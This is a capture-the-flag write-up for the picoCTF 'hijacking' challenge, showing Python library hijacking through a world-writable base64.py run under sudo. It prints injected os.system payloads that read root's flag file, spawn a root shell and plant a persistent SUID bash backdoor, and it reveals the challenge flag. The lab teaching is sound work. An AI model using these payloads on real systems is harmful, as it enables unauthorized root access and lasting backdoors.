# Python Library Hijacking - PicoCTF Challenge Writeup

**Challenge Name:** hijacking  
**Category:** General Skills / Privilege Escalation  
**Flag:** `picoCTF{pYth0nn_libraryH!j@CK!n9_13cfd3cc}`

## Challenge Description

Getting root access can allow you to read the flag. Luckily there is a python file that you might like to play with. Through Social engineering, we've got the credentials to use on the server. SSH is running on the server.

## Initial Reconnaissance

After connecting to the challenge server via SSH, let's explore the environment:

```bash
picoctf@challenge:~$ ls -la
total 16
drwxr-xr-x 1 picoctf picoctf   20 Aug 26 15:26 .
drwxr-xr-x 1 root    root      21 Aug  4  2023 ..
-rw-r--r-- 1 picoctf picoctf  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 picoctf picoctf 3771 Feb 25  2020 .bashrc
drwx------ 2 picoctf picoctf   34 Aug 26 15:26 .cache
-rw-r--r-- 1 picoctf picoctf  807 Feb 25  2020 .profile
-rw-r--r-- 1 root    root     375 Feb  7  2024 .server.py
```

Interesting! There's a `.server.py` file owned by root. Let's examine its contents:

```bash
picoctf@challenge:~$ cat .server.py
import base64
import os
import socket
ip = 'picoctf.org'
response = os.system("ping -c 1 " + ip)
#saving ping details to a variable
host_info = socket.gethostbyaddr(ip) 
#getting IP from a domaine
host_info_to_str = str(host_info[2])
host_info = base64.b64encode(host_info_to_str.encode('ascii'))
print("Hello, this is a part of information gathering",'Host: ', host_info)
```

## Key Observations

1. **The script imports `base64`** - This is crucial for our attack vector
2. **File ownership**: The script is owned by root
3. **Functionality**: The script performs network operations and uses base64 encoding
4. **Potential sudo access**: Given the challenge description mentions getting root access

Let's check if we can run this script with elevated privileges:

```bash
picoctf@challenge:~$ sudo python3 /home/picoctf/.server.py
```

If this works, we have a potential privilege escalation vector through Python library hijacking.

## Vulnerability Analysis

The key to this challenge lies in Python's module import system and file permissions. Let's examine the Python library path:

```bash
picoctf@challenge:~$ python3
>>> import sys
>>> print(sys.path)
['', '/usr/lib/python38.zip', '/usr/lib/python3.8', '/usr/lib/python3.8/lib-dynload', '/usr/local/lib/python3.8/dist-packages', '/usr/lib/python3/dist-packages']
>>> quit()
```

Python looks for modules in these directories in order. Let's check the permissions on the `base64.py` file:

```bash
picoctf@challenge:~$ ls -la /usr/lib/python3.8/base64.py
-rwxrwxrwx 1 root root  20382 May 26  2023 base64.py
```

**CRITICAL VULNERABILITY FOUND!** 

The `base64.py` file has world-writable permissions (`rwxrwxrwx`). This means any user can modify this system library file!

## Exploitation

### Understanding the Attack Vector

When Python executes `import base64`, it:
1. Locates the `base64.py` file in the library path
2. Executes the entire file as Python code
3. Any code at the module level (not inside functions) runs immediately

Since we can modify `base64.py` and the `.server.py` script can be run with `sudo`, we can inject malicious code that will execute with root privileges.

### Step 1: Modify the base64.py Library

We need to edit the `base64.py` file to inject our payload. Since `nano` isn't available, we'll use `vi`:

```bash
picoctf@challenge:~$ vi /usr/lib/python3.8/base64.py
```

Add the following code **at the very beginning** of the `base64.py` file:

```python
import os
os.system('whoami')
os.system('ls -al /root')
os.system('cat /root/.flag.txt')
```

**Important**: Don't delete the original content of `base64.py`! Just add your malicious code at the top. The original functions are needed for the base64 module to work properly.

### Step 2: Trigger the Attack

Now execute the server script with sudo privileges:

```bash
picoctf@challenge:~$ sudo python3 /home/picoctf/.server.py
```

### Step 3: Capture the Flag

When the script runs:
1. Python imports the modified `base64` module
2. Our injected code executes first with root privileges
3. The code reads the flag file and prints it
4. The original script continues (and may error out, but that's fine)

## Expected Output

```bash
picoctf@challenge:~$ sudo python3 /home/picoctf/.server.py
root
picoCTF{pYth0nn_libraryH!j@CK!n9_13cfd3cc}
sh: 1: ping: not found
Traceback (most recent call last):
  File "/home/picoctf/.server.py", line 7, in module>
    host_info = socket.gethostbyaddr(ip) 
socket.gaierror: [Errno -5] No address associated with hostname
```

Success! The flag is: **`picoCTF{pYth0nn_libraryH!j@CK!n9_13cfd3cc}`**

## Technical Explanation

### Why This Works

1. **Module Import Execution**: When Python imports a module, it executes all code at the module level
2. **File Permission Vulnerability**: The world-writable `base64.py` allows arbitrary code injection
3. **Privilege Escalation**: Running with `sudo` elevates our injected code to root privileges
4. **Import Order**: Our code executes before any base64 functions are called

### Attack Flow Diagram

```
User modifies base64.py → sudo python3 script.py → import base64 → 
Malicious code executes as root → Flag retrieved → Original script continues
```

## Alternative Exploitation Methods

### Method 1: Spawn Root Shell
Instead of just reading the flag, you could spawn a root shell:

```python
import os
os.system('/bin/bash')
```

### Method 2: Create SUID Binary
Create a persistent backdoor:

```python
import os
os.system('cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash')
```

Then later:
```bash
/tmp/rootbash -p
```

## Lessons Learned

### Security Issues Demonstrated

1. **File Permission Misconfiguration**: System libraries should never be world-writable
2. **Privilege Escalation via Import**: Importing modules in privileged contexts is dangerous
3. **Python Path Hijacking**: Attackers can weaponize Python's import mechanism

### Defensive Measures

1. **Proper File Permissions**: System libraries should be read-only for non-privileged users
2. **Virtual Environments**: Use isolated Python environments for applications
3. **Principle of Least Privilege**: Don't run scripts with unnecessary sudo access
4. **Code Review**: Audit scripts that run with elevated privileges

### Real-World Implications

This attack pattern appears in:
- Containerized environments with shared Python libraries
- Systems with misconfigured package managers
- Development environments with relaxed permissions
- CI/CD pipelines with inadequate isolation

## Flag

**`picoCTF{pYth0nn_libraryH!j@CK!n9_13cfd3cc}`**

